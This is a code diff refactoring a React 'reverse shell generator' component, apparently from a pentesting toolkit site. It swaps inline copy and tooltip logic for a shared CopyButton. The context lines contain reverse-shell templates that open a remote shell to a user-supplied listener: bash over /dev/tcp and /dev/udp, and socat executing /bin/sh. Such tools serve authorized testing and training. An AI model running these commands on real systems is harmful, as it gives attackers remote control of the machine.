@@ -1,18 +1,12 @@
 'use client'
 
-import { Check, Copy } from 'lucide-react'
 import { useEffect, useRef, useState } from 'react'
 
+import { CopyButton } from '@/components/tools/copy-button'
 import { Button } from '@/components/ui/button'
 import { Card, CardContent } from '@/components/ui/card'
 import { Input } from '@/components/ui/input'
 import { Separator } from '@/components/ui/separator'
-import {
-    Tooltip,
-    TooltipContent,
-    TooltipProvider,
-    TooltipTrigger,
-} from '@/components/ui/tooltip'
 
 interface ShellTemplate {
     name: string
@@ -24,14 +18,12 @@ const SHELLS: ShellTemplate[] = [
     {
         name: 'Bash TCP',
         category: 'Unix',
-        command: (ip, port) =>
-            `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+        command: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
     },
     {
         name: 'Bash UDP',
         category: 'Unix',
-        command: (ip, port) =>
-            `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
+        command: (ip, port) => `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
     },
     {
         name: 'sh TCP',
@@ -113,8 +105,7 @@ const SHELLS: ShellTemplate[] = [
     {
         name: 'Socat TCP',
         category: 'Unix',
-        command: (ip, port) =>
-            `socat TCP:${ip}:${port} EXEC:/bin/sh`,
+        command: (ip, port) => `socat TCP:${ip}:${port} EXEC:/bin/sh`,
     },
     {
         name: 'Socat PTY',
@@ -129,25 +120,12 @@ const CATEGORIES = Array.from(new Set(SHELLS.map((s) => s.category)))
 export default function ReverseShellGenerator() {
     const [ip, setIp] = useState('10.10.10.10')
     const [port, setPort] = useState('4444')
-    const [copied, setCopied] = useState<string | null>(null)
     const [activeCategory, setActiveCategory] = useState<string>('All')
     const ipRef = useRef<HTMLInputElement>(null)
 
     useEffect(() => {
         if (ipRef.current) ipRef.current.focus()
     }, [])
-
-    useEffect(() => {
-        if (copied) {
-            const t = setTimeout(() => setCopied(null), 2000)
-            return () => clearTimeout(t)
-        }
-    }, [copied])
-
-    const copyShell = (name: string, command: string) => {
-        navigator.clipboard.writeText(command)
-        setCopied(name)
-    }
 
     const filtered =
         activeCategory === 'All'
@@ -164,7 +142,7 @@ export default function ReverseShellGenerator() {
                 <CardContent className="pt-6">
                     <div className="flex flex-col gap-4 sm:flex-row">
                         <div className="flex-1">
-                            <label className="text-muted-foreground mb-1 block text-xs font-medium uppercase tracking-wide">
+                            <label className="text-muted-foreground mb-1 block text-xs font-medium tracking-wide uppercase">
                                 Listener IP / Host
                             </label>
                             <Input
@@ -177,7 +155,7 @@ export default function ReverseShellGenerator() {
                             />
                         </div>
                         <div className="w-full sm:w-32">
-                            <label className="text-muted-foreground mb-1 block text-xs font-medium uppercase tracking-wide">
+                            <label className="text-muted-foreground mb-1 block text-xs font-medium tracking-wide uppercase">
                                 Port
                             </label>
                             <Input
@@ -227,37 +205,11 @@ export default function ReverseShellGenerator() {
                                             {shell.category}
                                         </span>
                                     </div>
-                                    <TooltipProvider>
-                                        <Tooltip>
-                                            <TooltipTrigger asChild>
-                                                <Button
-                                                    variant="ghost"
-                                                    size="icon"
-                                                    className="h-7 w-7 shrink-0"
-                                                    onClick={() =>
-                                                        copyShell(
-                                                            shell.name,
-                                                            command
-                                                        )
-                                                    }
-                                                >
-                                                    {copied === shell.name ? (
-                                                        <Check className="h-3.5 w-3.5" />
-                                                    ) : (
-                                                        <Copy className="h-3.5 w-3.5" />
-                                                    )}
-                                                    <span className="sr-only">
-                                                        Copy
-                                                    </span>
-                                                </Button>
-                                            </TooltipTrigger>
-                                            <TooltipContent>
-                                                {copied === shell.name
-                                                    ? 'Copied!'
-                                                    : 'Copy'}
-                                            </TooltipContent>
-                                        </Tooltip>
-                                    </TooltipProvider>
+                                    <CopyButton
+                                        value={command}
+                                        label={`Copy ${shell.name} command`}
+                                        className="shrink-0"
+                                    />
                                 </div>
                                 <div className="bg-secondary/20 overflow-x-auto rounded p-3 font-mono text-xs whitespace-pre">
                                     {command}
